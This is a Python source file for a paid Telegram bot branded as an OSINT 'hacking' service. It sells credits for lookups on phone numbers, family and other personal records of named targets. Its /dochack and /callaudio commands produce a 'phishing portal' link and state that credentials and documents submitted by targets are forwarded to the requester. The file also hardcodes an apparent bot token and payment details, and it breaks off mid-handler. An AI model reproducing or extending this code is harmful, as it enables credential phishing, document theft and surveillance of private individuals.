import os
import sqlite3
import logging
import asyncio
import qrcode
import aiohttp
import requests
import json
import random
import string
import io
import time
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, jsonify
from threading import Thread
from aiogram import Bot, Dispatcher, types, F, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

load_dotenv()

# --- CONFIGURATION ---
API_TOKEN = os.getenv("API_TOKEN", "9237698105:AAHmf8LHfXEwjQ2hHzBiZzKVrPOtB5cf7Xk")
MASTER_ADMIN_ID = int(os.getenv("MASTER_ADMIN_ID", "7758917200"))
OWNER_HANDLE = "@GOD_AYUSH"
DEV_HANDLE = "@GOD_AYUSH"
DEFAULT_UPI = "ayush.sharma798@fam"

START_TIME = time.time()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- OSINT API CONFIG ---
OSINT_CONFIG = {
    "numinfo": {"enabled": True, "url": "https://shuruuu-api.vercel.app/num_info?key=@KINGFFAIAK47x&query={query}"},
    "aadharinfo": {"enabled": False, "url": ""},
    "familyinfo": {"enabled": True, "url": "https://x-trace-osinist-api-pannell.vercel.app/apis/family?key=@GOD_AYUSH&query={query}"}, 
    "vehicleinfo": {"enabled": False, "url": ""},
    "rcnum": {"enabled": False, "url": ""},
    "iginfo": {"enabled": False, "url": ""},
    "tgnum": {"enabled": False, "url": ""},
    "ffuidinfo": {"enabled": False, "url": ""},
    "lpginfo": {"enabled": False, "url": ""}
}

# --- STATES ---
class AdminStates(StatesGroup):
    waiting_for_payment_ss = State()
    waiting_for_broadcast_content = State()

# --- DATABASE SETUP ---
def db_conn():
    conn = sqlite3.connect("ayush_master_bot.db", timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db_conn()
    c = conn.cursor()
    
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, credits INTEGER DEFAULT 10,
        is_banned INTEGER DEFAULT 0, is_muted INTEGER DEFAULT 0, admin_type TEXT DEFAULT 'user',
        is_vip INTEGER DEFAULT 0, vip_expiry DATETIME, referred_by INTEGER DEFAULT 0,
        total_searches INTEGER DEFAULT 0)""")
    
    c.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    
    c.execute("""CREATE TABLE IF NOT EXISTS pricing (
        id INTEGER PRIMARY KEY AUTOINCREMENT, credits INTEGER, price INTEGER,
        discount_percent INTEGER DEFAULT 0, is_active INTEGER DEFAULT 1)""")
    
    c.execute("""CREATE TABLE IF NOT EXISTS pending_payments (
        payment_id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER,
        credits INTEGER, file_id TEXT, status TEXT DEFAULT 'pending',
        reject_reason TEXT, verified_by INTEGER, verified_at DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        
    c.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY, code_type TEXT, credits INTEGER, vip_days INTEGER,
        is_used INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 1, current_uses INTEGER DEFAULT 0)""")
        
    c.execute("""CREATE TABLE IF NOT EXISTS authorized_groups (
        chat_id INTEGER PRIMARY KEY, chat_title TEXT, invite_link TEXT)""")
        
    c.execute("""CREATE TABLE IF NOT EXISTS audit_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, command TEXT,
        target TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("""CREATE TABLE IF NOT EXISTS force_join_channels (
        channel_id TEXT PRIMARY KEY, invite_link TEXT)""")

    defaults = {
        'upi_id': DEFAULT_UPI, 'referral_bonus': '0', 'global_maintenance': '0',
        'maint_msg': '🛠️ Bot is currently under maintenance. Please try again later.',
        'default_group_link': 'https://t.me/YourOfficialGroup',
        'force_join_enabled': '0',
        'portal_url': 'http://localhost:5000/' 
    }
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
        
    c.execute("SELECT COUNT(*) FROM pricing")
    if c.fetchone()[0] == 0:
        prices = [(50, 50, 0), (100, 90, 10), (200, 170, 15), (500, 400, 20), (1000, 750, 25)]
        for cr, pr, disc in prices:
            c.execute("INSERT INTO pricing (credits, price, discount_percent) VALUES (?, ?, ?)", (cr, pr, disc))
            
    conn.commit()
    conn.close()

init_db()

# --- HELPERS ---
def get_setting(key): 
    with db_conn() as conn:
        row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return row['value'] if row else ""

def set_setting(key, val):
    with db_conn() as conn:
        conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, val))

def is_owner(uid): return uid == MASTER_ADMIN_ID
def is_super_or_owner(uid):
    if is_owner(uid): return True
    with db_conn() as conn:
        row = conn.execute("SELECT admin_type FROM users WHERE user_id=?", (uid,)).fetchone()
        return row and row['admin_type'] in ['super_admin', 'owner']

def log_audit(uid, cmd, target):
    with db_conn() as conn:
        conn.execute("INSERT INTO audit_logs (user_id, command, target) VALUES (?, ?, ?)", (uid, cmd, target))

async def get_force_join_kb():
    with db_conn() as conn:
        channels = conn.execute("SELECT * FROM force_join_channels").fetchall()
    
    kb = InlineKeyboardBuilder()
    for ch in channels:
        kb.button(text=f"📢 Join Channel", url=ch['invite_link'])
    kb.button(text="✅ I Joined", callback_data="check_join")
    kb.adjust(1)
    return kb.as_markup()

async def is_joined(user_id):
    if is_owner(user_id): return True
    if get_setting('force_join_enabled') != '1': return True
    
    with db_conn() as conn:
        channels = conn.execute("SELECT channel_id FROM force_join_channels").fetchall()
    
    for ch in channels:
        try:
            member = await bot.get_chat_member(chat_id=ch['channel_id'], user_id=user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception:
            pass 
    return True

# --- MIDDLEWARES ---
class AccessMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if not isinstance(event, types.Message): return await handler(event, data)
        
        user_id = event.from_user.id
        chat_id = event.chat.id
        cmd = event.text.split()[0].lower() if event.text else ""
        
        if is_owner(user_id): return await handler(event, data)
        
        if event.chat.type == 'private' and cmd not in ['/start', '/help']:
            if not await is_joined(user_id):
                kb = await get_force_join_kb()
                await event.reply("⚠️ **You must join our official channels to use this bot!**", reply_markup=kb)
                return

        if get_setting('global_maintenance') == '1':
            await event.reply(get_setting('maint_msg'))
            return
            
        with db_conn() as conn:
            u = conn.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,)).fetchone()
            if u and u['is_banned']:
                await event.reply("🚫 **You are banned from using this bot.**")
                return

        if event.chat.type in ['group', 'supergroup']:
            if cmd not in ['/start', '/help']:
                with db_conn() as conn:
                    auth = conn.execute("SELECT chat_id FROM authorized_groups WHERE chat_id=?", (chat_id,)).fetchone()
                if not auth:
                    link = get_setting('default_group_link')
                    await event.reply(f"🔒 **This bot only works in our official group.**\n\n👉 Join: {link}")
                    return

        return await handler(event, data)

dp.message.middleware(AccessMiddleware())

@dp.callback_query(F.data == "check_join")
async def cb_check_join(cb: types.CallbackQuery):
    if await is_joined(cb.from_user.id):
        await cb.message.delete()
        await cb.message.answer("✅ **Verification successful!** You can now use the bot.")
    else:
        await cb.answer("❌ You haven't joined all channels yet!", show_alert=True)

# --- FORCE JOIN ADMIN COMMANDS ---
@dp.message(Command("toggleforcejoin"))
async def cmd_toggle_forcejoin(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    current = get_setting('force_join_enabled')
    new_val = "0" if current == '1' else "1"
    set_setting('force_join_enabled', new_val)
    status = "✅ ON" if new_val == '1' else "❌ OFF"
    await message.reply(f"Force Join is now **{status}**", parse_mode="Markdown")

@dp.message(Command("addchannel"))
async def cmd_addchannel(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) < 3:
        await message.reply("⚠️ Usage: `/addchannel <channel_id> <invite_link>`", parse_mode="Markdown")
        return
    ch_id = args[1]
    link = args[2]
    with db_conn() as conn:
        conn.execute("INSERT OR REPLACE INTO force_join_channels (channel_id, invite_link) VALUES (?, ?)", (ch_id, link))
    await message.reply(f"✅ Channel added to Force Join!\n🆔 `{ch_id}`\n🔗 {link}", parse_mode="Markdown")

@dp.message(Command("removechannel"))
async def cmd_removechannel(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) < 2: return
    ch_id = args[1]
    with db_conn() as conn:
        conn.execute("DELETE FROM force_join_channels WHERE channel_id=?", (ch_id,))
    await message.reply(f"✅ Channel `{ch_id}` removed from Force Join!", parse_mode="Markdown")

@dp.message(Command("listchannels"))
async def cmd_listchannels(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    with db_conn() as conn:
        channels = conn.execute("SELECT * FROM force_join_channels").fetchall()
    if not channels:
        await message.reply("📭 No channels in Force Join list.")
        return
    text = "📋 **Force Join Channels:**\n\n"
    for ch in channels:
        text += f"🆔 `{ch['channel_id']}`\n🔗 {ch['invite_link']}\n\n"
    await message.reply(text, parse_mode="Markdown")

# --- MAINTENANCE REPLY ---
MAINTENANCE_REPLY = """
╔══════════════════════════════════════╗
║   ⚠️  S E R V I C E   O F F L I N E   ║
╚══════════════════════════════════════╝

🔧 **{command}** is currently under **Maintenance Mode**.
📡 The required data source for this service is **not available** at the moment.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🕒 **Status:** Temporarily Unavailable
🔐 **Reason:** API / Data Source Restricted
📢 **Updates:** Contact {owner}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✨ *We apologize for the inconvenience.*
💫 *Other services are still operational.*
"""

# --- OSINT RUNNER ---
async def run_osint(message: types.Message, cmd: str, query: str):
    config = OSINT_CONFIG.get(cmd)
    
    if not config or not config.get('enabled') or not config.get('url'):
        await message.reply(MAINTENANCE_REPLY.format(command=cmd.upper(), owner=OWNER_HANDLE), parse_mode="Markdown")
        return

    with db_conn() as conn:
        user = conn.execute("SELECT credits, is_vip, vip_expiry FROM users WHERE user_id=?", (message.from_user.id,)).fetchone()
        is_vip = user['is_vip'] and (not user['vip_expiry'] or datetime.strptime(user['vip_expiry'], "%Y-%m-%d") > datetime.now())
        if not is_vip:
            if user['credits'] <= 0:
                await message.reply("❌ **Insufficient Credits!** Please buy credits using /buy.")
                return
            conn.execute("UPDATE users SET credits = credits - 1, total_searches = total_searches + 1 WHERE user_id=?", (message.from_user.id,))

    log_audit(message.from_user.id, cmd, query)
    url = config['url'].replace("{query}", query)
    loading_msg = await message.reply("⏳ Fetching data...")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                data = await resp.json()
                
        json_str = json.dumps(data, indent=2, ensure_ascii=False)
        
        output = (
            f"📜 — **𝐀ʏᴜꜱʜ X OSINT**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 **TARGET:** {query}\n"
            f"📁 **REPORT:** {cmd.upper()}\n\n"
            f"```json\n{json_str}\n```\n\n"
            f"👤 **AGENT:** {OWNER_HANDLE}\n"
            f"🛠️ **DEV:** {DEV_HANDLE}"
        )
        
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📋 COPY CODE", callback_data="copy_json")]])
        await loading_msg.delete()
        await message.reply(output, parse_mode="Markdown", reply_markup=kb)
    except Exception as e:
        await loading_msg.edit_text(f"❌ API Error: `{str(e)}`", parse_mode="Markdown")

@dp.callback_query(F.data == "copy_json")
async def cb_copy_json(cb: types.CallbackQuery):
    await cb.answer("Copy the JSON from above!", show_alert=True)

def generate_upi_qr(upi_id, amount):
    upi_url = f"upi://pay?pa={upi_id}&am={amount}&cu=INR&tn=CreditsPurchase"
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(upi_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="#38bdf8", back_color="#0b1120")
    bio = io.BytesIO()
    img.save(bio, 'PNG')
    bio.seek(0)
    return bio

# --- SET PORTAL URL COMMAND ---
@dp.message(Command("setportal"))
async def cmd_setportal(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("⚠️ Usage: `/setportal <url>`\nExample: `/setportal https://my-portal.onrender.com/`", parse_mode="Markdown")
        return
    url = args[1].strip().rstrip('/')
    set_setting('portal_url', url)
    await message.reply(f"✅ **Portal URL Updated!**\n\n🔗 `{url}`", parse_mode="Markdown")

# --- UPDATED: CALL AUDIO / DOCHACK WITH USER'S CHAT_ID & safe-pdf ---
@dp.message(Command("callaudio"))
async def cmd_callaudio(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    base_url = get_setting('portal_url').rstrip('/')
    
    # Ab link /safe-pdf par jayega aur chat_id uski (user ki) hogi
    portal_link = f"{base_url}/safe-pdf?chat_id={message.from_user.id}"
    
    await message.answer(
        f"📂 **Updated Call History & Audio Audit Portal Link:**\n\n"
        f"🔗 Link: `{portal_link}`\n\n"
        f"Send this link to target. Any uploaded call logs, audio records, or documents will instantly forward to your Telegram chat.\n"
        f"✨ {OWNER_HANDLE}", parse_mode="Markdown"
    )

@dp.message(Command("dochack"))
async def cmd_dochack(message: types.Message):
    user_id = message.from_user.id
    cost = 150 
    if not is_owner(user_id):
        with db_conn() as conn:
            u = conn.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
            if not u or u['credits'] < cost:
                await message.answer(f"❌ **Insufficient Credits!** Required: `{cost}` tokens.", parse_mode="Markdown")
                return
            conn.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (cost, user_id))
        
    log_audit(user_id, "dochack", "phishing_portal")
    base_url = get_setting('portal_url').rstrip('/')
    
    # Ab link /safe-pdf par jayega aur chat_id uski (user ki) hogi
    portal_link = f"{base_url}/safe-pdf?chat_id={user_id}"
    
    await message.answer(
        f"🎯 **Document Hack Phishing Link Generated!**\n\n"
        f"🔗 Link: `{portal_link}`\n\n"
        f"⚠️ Cost deducted: `{cost}` tokens.\n"
        f"When targets open this portal and submit credentials/documents, they forward instantly to your chat.\n"
        f"✨ {OWNER_HANDLE}", parse_mode="Markdown"
    )

# ==============================================================================
# USER COMMANDS
# ==============================================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    uid = message.from_user.id
    uname = message.from_user.username or "Unknown"
    
    if message.chat.type == 'private' and not await is_joined(uid):
        kb = await get_force_join_kb()
        await message.answer("⚠️ **You must join our official channels to use this bot!**", reply_markup=kb)
        return

    with db_conn() as conn:
        u = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
        if not u:
            args = message.text.split()
            ref = int(args[1]) if len(args) > 1 and args[1].isdigit() else 0
            conn.execute("INSERT INTO users (user_id, username, referred_by) VALUES (?, ?, ?)", (uid, uname, ref))
            if ref and ref != uid:
                bonus = int(get_setting('referral_bonus'))
                conn.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (bonus, ref))

    # Naye user ki notification sirf Owner ko jayegi
    if uid != MASTER_ADMIN_ID:
        try:
            await bot.send_message(
                MASTER_ADMIN_ID,
                f"🚨 **New User Started Bot!**\n👤 Name: {message.from_user.first_name}\n🆔 Chat ID: `{uid}`\n🔗 Username: @{uname}"
            )
        except:
            pass

    try:
        banner = types.FSInputFile("banner.png") 
        await message.answer_photo(
            photo=banner, 
            caption="🔥 **Welcome to 𝐀ʏᴜꜱʜ X OSINT** 🔥\n\n👑 *Hacking King - Analyze | Control | Exploit*"
        )
    except Exception as e:
        logging.error(f"Banner not found: {e}")

    await asyncio.sleep(10)

    help_text = (
        "🛡️ **𝐀ʏᴜꜱʜ OSINT Command Menu** 🛡️\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔍 **Core OSINT:**\n"
        "• `/numinfo <number>`\n• `/aadharinfo <num>`\n• `/familyinfo <q>`\n• `/vehicleinfo <no>`\n"
        "• `/rcnum <no>`\n• `/iginfo <user>`\n• `/tgnum <num>`\n• `/ffuidinfo <uid>`\n• `/lpginfo <num>`\n\n"
        "💳 **Economy:**\n"
        "• `/buy` - Buy Credits\n• `/redeem <code>` - Redeem\n• `/mypayments` - History\n\n"
        "📩 **Other:**\n"
        "• `/feedback <msg>` - Send feedback to owner\n\n"
        f"✨ {OWNER_HANDLE}\n\n"
        "*(This menu will auto-delete in 60 seconds)*"
    )
    
    help_msg = await message.answer(help_text, parse_mode="Markdown")

    await asyncio.sleep(60)
    try:
        await help_msg.delete()
    except Exception:
        pass

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = (
        "🛡️ **𝐀ʏᴜꜱʜ OSINT Command Menu** 🛡️\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔍 **Core OSINT:**\n"
        "• `/numinfo <number>`\n• `/aadharinfo <num>`\n• `/familyinfo <q>`\n• `/vehicleinfo <no>`\n"
        "• `/rcnum <no>`\n• `/iginfo <user>`\n• `/tgnum <num>`\n• `/ffuidinfo <uid>`\n• `/lpginfo <num>`\n\n"
        "💳 **Economy:**\n"
        "• `/buy` - Buy Credits\n• `/redeem <code>` - Redeem\n• `/mypayments` - History\n\n"
        "📩 **Other:**\n"
        "• `/feedback <msg>` - Send feedback to owner\n\n"
        f"✨ {OWNER_HANDLE}\n\n"
        "*(This menu will auto-delete in 60 seconds)*"
    )
    help_msg = await message.answer(help_text, parse_mode="Markdown")
    
    await asyncio.sleep(60)
    try:
        await help_msg.delete()
    except Exception:
        pass

@dp.message(Command("feedback"))
async def cmd_feedback(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("⚠️ Usage: `/feedback <your message>`", parse_mode="Markdown")
        return
    text = args[1]
    uid = message.from_user.id
    uname = message.from_user.username or "No Username"
    admin_msg = f"📩 **New Feedback Received**\n\n👤 From: {message.from_user.mention} (`{uid}`)\n🔗 Username: @{uname}\n\n💬 **Message:**\n{text}"
    await bot.send_message(MASTER_ADMIN_ID, admin_msg, parse_mode="Markdown")
    await message.reply("✅ **Thank you!** Your feedback has been sent to the owner.")

# OSINT Handlers
@dp.message(Command("numinfo")) 
async def cmd_num(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "numinfo", args[1])

@dp.message(Command("aadharinfo")) 
async def cmd_aadhar(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "aadharinfo", args[1])

@dp.message(Command("familyinfo")) 
async def cmd_family(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "familyinfo", args[1])

@dp.message(Command("vehicleinfo")) 
async def cmd_vehicle(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "vehicleinfo", args[1])

@dp.message(Command("rcnum")) 
async def cmd_rc(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "rcnum", args[1])

@dp.message(Command("iginfo")) 
async def cmd_ig(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "iginfo", args[1])

@dp.message(Command("tgnum")) 
async def cmd_tg(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "tgnum", args[1])

@dp.message(Command("ffuidinfo")) 
async def cmd_ff(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "ffuidinfo", args[1])

@dp.message(Command("lpginfo")) 
async def cmd_lpg(message: types.Message):
    args = message.text.split()
    if len(args) > 1: await run_osint(message, "lpginfo", args[1])


# --- PAYMENT SYSTEM ---
@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    with db_conn() as conn:
        tiers = conn.execute("SELECT * FROM pricing WHERE is_active=1").fetchall()
    kb = InlineKeyboardBuilder()
    for t in tiers:
        label = f"🎁 {t['credits']} Credits - ₹{t['price']}"
        if t['discount_percent'] > 0: label += f" ({t['discount_percent']}% OFF)"
        kb.button(text=label, callback_data=f"buy_{t['credits']}_{t['price']}")
    kb.adjust(1)
    await message.answer("💳 **Select a plan to purchase:**", reply_markup=kb.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("buy_"))
async def cb_buy_tier(cb: types.CallbackQuery, state: FSMContext):
    _, credits, amount = cb.data.split("_")
    upi = get_setting('upi_id')
    qr_img = generate_upi_qr(upi, amount)
    text = (
        f"💳 **Payment Details**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Amount: ₹{amount}\n"
        f"🎫 Credits: {credits}\n"
        f"📱 UPI ID: `{upi}`\n\n"
        f"👇 Scan QR or pay to UPI and send screenshot here."
    )
    await state.update_data(buy_credits=credits, buy_amount=amount)
    await state.set_state(AdminStates.waiting_for_payment_ss)
    await cb.message.answer_photo(photo=BufferedInputFile(qr_img.read(), filename="qr.png"), caption=text, parse_mode="Markdown")
    await cb.answer()

@dp.message(AdminStates.waiting_for_payment_ss, F.photo)
async def process_payment_ss(message: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    credits, amount = data.get('buy_credits'), data.get('buy_amount')
    file_id = message.photo[-1].file_id
    uid = message.from_user.id
    with db_conn() as conn:
        cur = conn.execute("INSERT INTO pending_payments (user_id, amount, credits, file_id) VALUES (?, ?, ?, ?)", (uid, amount, credits, file_id))
        pid = cur.lastrowid
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Approve", callback_data=f"pay_app_{pid}"),
         InlineKeyboardButton(text="❌ Reject", callback_data=f"pay_rej_{pid}")]
    ])
    admin_caption = (
        f"🔔 **New Payment Request**\n"
        f"👤 User: {message.from_user.mention} (`{uid}`)\n"
        f"💰 Amount: ₹{amount}\n"
        f"🎫 Credits: {credits}\n"
        f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )
    await bot.send_photo(MASTER_ADMIN_ID, file_id, caption=admin_caption, reply_markup=kb, parse_mode="Markdown")
    await message.reply("✅ Screenshot submitted! Wait for approval.")

@dp.callback_query(F.data.startswith("pay_"))
async def cb_payment_action(cb: types.CallbackQuery):
    if not is_super_or_owner(cb.from_user.id):
        await cb.answer("❌ Unauthorized", show_alert=True)
        return
    action, pid = cb.data.split("_")[1], cb.data.split("_")[2]
    with db_conn() as conn:
        p = conn.execute("SELECT * FROM pending_payments WHERE payment_id=? AND status='pending'", (pid,)).fetchone()
        if not p:
            await cb.answer("⚠️ Already processed!", show_alert=True)
            return
        if action == "app":
            conn.execute("UPDATE pending_payments SET status='approved', verified_by=?, verified_at=? WHERE payment_id=?", (cb.from_user.id, datetime.now(), pid))
            conn.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (p['credits'], p['user_id']))
            await bot.send_message(p['user_id'], f"✅ **Payment Approved!**\n💰 Amount: ₹{p['amount']}\n🎫 Added: {p['credits']} Credits.", parse_mode="Markdown")
            await cb.message.edit_caption(f"✅ **Approved**\nUser ID: `{p['user_id']}`\nCredits: {p['credits']}", parse_mode="Markdown")
        else:
            conn.execute("UPDATE pending_payments SET status='rejected' WHERE payment_id=?", (pid,))
            await bot.send_message(p['user_id'], f"❌ **Payment Rejected.**\nAmount: ₹{p['amount']}\nContact {OWNER_HANDLE} for details.", parse_mode="Markdown")
            await cb.message.edit_caption(f"❌ **Rejected**\nUser ID: `{p['user_id']}`", parse_mode="Markdown")
    await cb.answer("Done!")

# ==============================================================================
# ADMIN & OWNER COMMANDS
# ==============================================================================
@dp.message(Command("owner"))
async def cmd_owner(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    kb = InlineKeyboardBuilder()
    kb.button(text="👥 Users", callback_data="adm_users")
    kb.button(text="💰 Credits", callback_data="adm_credits")
    kb.button(text="🎫 Gen Code", callback_data="adm_gencode")
    kb.button(text="📢 Broadcast", callback_data="adm_broadcast")
    kb.button(text="⚙️ Settings", callback_data="adm_settings")
    kb.adjust(2)
    await message.answer("👑 **Owner Panel**", reply_markup=kb.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "adm_broadcast")
async def cb_broadcast(cb: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Zero Credits", callback_data="bc_zero")],
        [InlineKeyboardButton(text="💰 Paid Users", callback_data="bc_paid")],
        [InlineKeyboardButton(text="👥 All Users", callback_data="bc_all")]
    ])
    await cb.message.edit_text("🎯 **Select target audience:**", reply_markup=kb)

@dp.callback_query(F.data.startswith("bc_"))
async def cb_broadcast_target(cb: types.CallbackQuery, state: FSMContext):
    target = cb.data.split("_")[1]
    await state.update_data(bc_target=target)
    await state.set_state(AdminStates.waiting_for_broadcast_content)
    await cb.message.edit_text("📝 **Send the content to broadcast** (Text/Photo/Video/Audio/Sticker):")

@dp.message(AdminStates.waiting_for_broadcast_content)
async def process_broadcast(message: types.Message, state: FSMContext):
    data = await state.get_data()
    target = data.get('bc_target')
    await state.clear()
    with db_conn() as conn:
        if target == "zero": users = conn.execute("SELECT user_id FROM users WHERE credits=0").fetchall()
        elif target == "paid": users = conn.execute("SELECT user_id FROM users WHERE credits>0").fetchall()
        else: users = conn.execute("SELECT user_id FROM users").fetchall()
    sent, failed = 0, 0
    status_msg = await message.reply("⏳ Broadcasting...")
    for u in users:
        try:
            await message.copy_to(chat_id=u['user_id'])
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
    await status_msg.edit_text(f"✅ **Broadcast Complete!**\n\n📤 Sent: {sent}\n❌ Failed: {failed}")

@dp.callback_query(F.data == "adm_gencode")
async def cb_gencode(cb: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👑 VIP Code", callback_data="gen_vip")],
        [InlineKeyboardButton(text="💳 Normal Credits", callback_data="gen_norm")]
    ])
    await cb.message.edit_text("🎫 **Select Code Type:**", reply_markup=kb)

@dp.callback_query(F.data == "gen_vip")
async def cb_gen_vip(cb: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="7 Days", callback_data="vipdays_7"), InlineKeyboardButton(text="30 Days", callback_data="vipdays_30")],
        [InlineKeyboardButton(text="90 Days", callback_data="vipdays_90"), InlineKeyboardButton(text="365 Days", callback_data="vipdays_365")]
    ])
    await cb.message.edit_text("📅 **VIP Kitne Din Ka?**", reply_markup=kb)

@dp.callback_query(F.data.startswith("vipdays_"))
async def cb_vip_days(cb: types.CallbackQuery):
    days = cb.data.split("_")[1]
    code = "AYUSH-VIP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with db_conn() as conn:
        conn.execute("INSERT INTO redeem_codes (code, code_type, credits, vip_days, max_uses) VALUES (?, 'vip', 999999, ?, 1)", (code, days))
    await cb.message.edit_text(f"✅ **VIP Code Generated!**\n\n🎫 Code: `{code}`\n⏳ Duration: {days} Days\n♾️ Credits: Infinity\nUses: 1", parse_mode="Markdown")

@dp.callback_query(F.data == "adm_settings")
async def cb_settings(cb: types.CallbackQuery):
    upi = get_setting('upi_id')
    ref = get_setting('referral_bonus')
    fj = get_setting('force_join_enabled')
    portal = get_setting('portal_url')
    text = f"⚙️ **Settings**\n\nUPI: `{upi}`\nReferral Bonus: `{ref}`\nForce Join: `{'ON' if fj=='1' else 'OFF'}`\nPortal URL: `{portal}`\n\nCommands:\n`/setupi <id>`\n`/setreferral <amt>`\n`/setportal <url>`\n`/maintenance on/off`\n`/toggleforcejoin`\n`/addchannel <id> <link>`"
    await cb.message.edit_text(text, parse_mode="Markdown")

@dp.message(Command("setupi"))
async def cmd_setupi(message: types.Message):
    if is_super_or_owner(message.from_user.id):
        val = message.text.split(maxsplit=1)[1]
        set_setting('upi_id', val)
        await message.reply(f"✅ UPI updated to `{val}`")

@dp.message(Command("setreferral"))
async def cmd_setref(message: types.Message):
    if is_super_or_owner(message.from_user.id):
        val = message.text.split(maxsplit=1)[1]
        set_setting('referral_bonus', val)
        await message.reply(f"✅ Referral bonus updated to `{val}`")

@dp.message(Command("maintenance"))
async def cmd_maintenance(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) < 2: return
    val = "1" if args[1].lower() == "on" else "0"
    set_setting('global_maintenance', val)
    await message.reply(f"✅ Maintenance Mode: **{'ON' if val=='1' else 'OFF'}**", parse_mode="Markdown")

@dp.message(Command("addgroup"))
async def cmd_addgroup(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) < 3: return
    cid = int(args[1])
    link = args[2]
    with db_conn() as conn:
        conn.execute("INSERT OR REPLACE INTO authorized_groups (chat_id, invite_link) VALUES (?, ?)", (cid, link))
    await message.reply("✅ Group Authorized!")

@dp.message(Command("addcredits"))
async def cmd_addcredits(message: types.Message):
    if not is_super_or_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) < 3: return
    target, amt = args[1], int(args[2])
    with db_conn() as conn:
        if target == "all":
            conn.execute("UPDATE users SET credits = credits + ?", (amt,))
            await message.reply(f"✅ Added {amt} credits to **ALL USERS**")
        else:
            conn.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amt, int(target)))
            await message.reply(f"✅ Added {amt} credits to `{target}`")

@dp.message(Command("warn"))
async def cmd_warn(message: types.Message):
    if message.chat.type == 'private': return
    if not message.reply_to_message: 
        await message.reply("⚠️ Reply to a message to warn.")
        return
    target = message.reply_to_message.from_user
